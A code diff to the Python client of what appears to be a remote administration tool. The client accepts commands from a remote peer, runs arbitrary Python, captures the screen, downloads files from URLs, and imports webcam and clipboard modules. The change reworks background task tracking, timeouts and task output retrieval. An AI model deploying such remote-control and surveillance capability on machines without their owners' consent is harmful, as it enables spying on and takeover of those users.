@@ -3,12 +3,14 @@ import json
 import logging
 import threading
 import subprocess
+import queue
 from contextlib import redirect_stdout, suppress
 from io import StringIO
 
 from cryptography.hazmat.primitives.asymmetric import ec
-from modules import clipboard, download, screen, webcam, windows
+from modules import clipboard, download, screen, webcam, windows, pyshell
 from utils.baseclient import BaseClient
+from utils import tasks
 
 logging.basicConfig(level=logging.DEBUG)
 
@@ -16,6 +18,9 @@ BLOCK_SIZE = 32768
 
 class Client(BaseClient):
     """ Client for managing commands """
+
+    # List of tasks that have output, but timed out
+    task_list: list[tasks.Task] = []
 
     def __init__(self, public_key: ec.EllipticCurvePublicKey) -> None:
         BaseClient.__init__(self, public_key)
@@ -51,6 +56,8 @@ class Client(BaseClient):
                 self.tasks()
             case 'STOPTASK':
                 self.stoptask()
+            case 'TASKOUTPUT':
+                self.taskoutput()
             case _:
                 logging.debug('Received unrecognized command: %s', command)
 
@@ -68,16 +75,21 @@ class Client(BaseClient):
     def interpreter(self) -> None:
         """ Open python interpreter for peer """
         command = self.read().decode()
-        logging.info('Executing python command: %s', command)
-        error_message = ''
 
-        with redirect_stdout(StringIO()) as output:
-            try:
-                exec(command)
-            except Exception as error:
-                error_message = f'{error.__class__.__name__}: {str(error)}\n'
+        # Create task
+        task = pyshell.pyshell(command)
+        self.task_list.append(task)
 
-        self.write((output.getvalue() + error_message).encode())
+        # Define a timeout for the command
+        timeout = 60
+
+        try:
+            output: str = task.output.get(timeout=timeout)
+        except queue.Empty:
+            self.write(f'Timed out after {timeout}s.'.encode())
+        else:
+            self.task_list.remove(task)
+            self.write(output.encode())
 
     def screenshot(self) -> None:
         """ Take a screenshot """
@@ -175,7 +187,7 @@ class Client(BaseClient):
         url, filename = json.loads(self.read().decode())
 
         try:
-            download.download(url, filename)
+            task = download.download(url, filename)
         except TimeoutError:
             logging.error("Download of '%s' timed out", url)
             self.write(b"Download timed out.")
@@ -183,6 +195,8 @@ class Client(BaseClient):
             logging.error("Error downloading file from the web: %s", str(error))
             self.write(str(error).encode())
         else:
+            # Add task to task_list
+            self.task_list.append(task)
             logging.info("Downloading file from '%s' as '%s'", url, filename)
             self.write(b'Success')
 
@@ -203,37 +217,68 @@ class Client(BaseClient):
             self.write(b'LOCKED')
 
     def tasks(self) -> None:
-        """ Get current tasks (background threads) """
-        tasks = []
-        for task in threading.enumerate():
-            # Skip main thread
-            if task == threading.main_thread():
-                continue
+        """ Get current tasks (background threads), removes fully processed ones """
+        task_info = []
+        tasks.clean(self.task_list)
+        # Create a copy to make sure removing items does not interfere with looping
+        task_list = self.task_list.copy()
+        for task in task_list:
 
-            info = json.loads(task.name)
-            tasks.append(info)
+            info = [task.identifer, task.native_id if task.is_alive() else None]
+            info.extend(json.loads(task.name))
 
-        self.write(json.dumps(tasks).encode())
+            task_info.append(info)
+
+        self.write(json.dumps(task_info).encode())
 
     def stoptask(self) -> None:
         """ Stop a running task """
         task_id = self.read().decode()
         logging.debug("Attempting to stop task (%s)", task_id)
 
-        # If the task is running, set the stop event
-        for task in threading.enumerate():
-            # Skip main thread
-            if task == threading.main_thread():
-                continue
+        task: tasks.Task = tasks.find(self.task_list, task_id)
 
-            if task_id == str(task.native_id):
-                task.stop_event.set()
-                self.write(b'STOPPED')
-                logging.debug("Stopped task id: %s (%s)", task_id, task.name)
-                return
+        if task is None:
+            self.write(b'Task could not be found.')
+            logging.debug("Task (%s) could not be found.", task_id)
+            return
 
-        logging.debug("Thread (%s) could not be found.", task_id)
-        self.write(b"Thread does not exist.")
+        if task.stop is None:
+            self.write(b'Task does not support stopping.')
+            logging.debug("Task %s (%s) does not support stopping. ", task.name, task_id)
+            return
+
+        # Stop task
+        task.stop.set()
+        logging.debug("Task stopped: %s (%s)", task.name, task_id)
+        self.write(b'STOPPED')
+
+    def taskoutput(self) -> None:
+        """ Get the output of a task if available """
+        task_id = self.read().decode()
+        logging.debug("Attempting to get task (%s) output", task_id)
+
+        task: tasks.Task = tasks.find(self.task_list, task_id)
+
+        if task is None:
+            self.write(b'Task could not be found.')
+            logging.debug("Task (%s) could not be found.", task_id)
+            return
+
+        if task.output is None:
+            self.write(b'Task does not support output.')
+            logging.debug("Task (%s) does not return output.", task_id)
+            return
+
+        if task.output.qsize() == 0:
+            self.write(b'Task is not ready.')
+            logging.debug("Task (%s) is not ready", task_id)
+            return
+
+        output: str = task.output.get()
+        logging.debug("Task (%s) output: %s", task_id, output)
+        self.write(b'READY')
+        self.write(output.encode())
 
 
 if __name__ == '__main__':
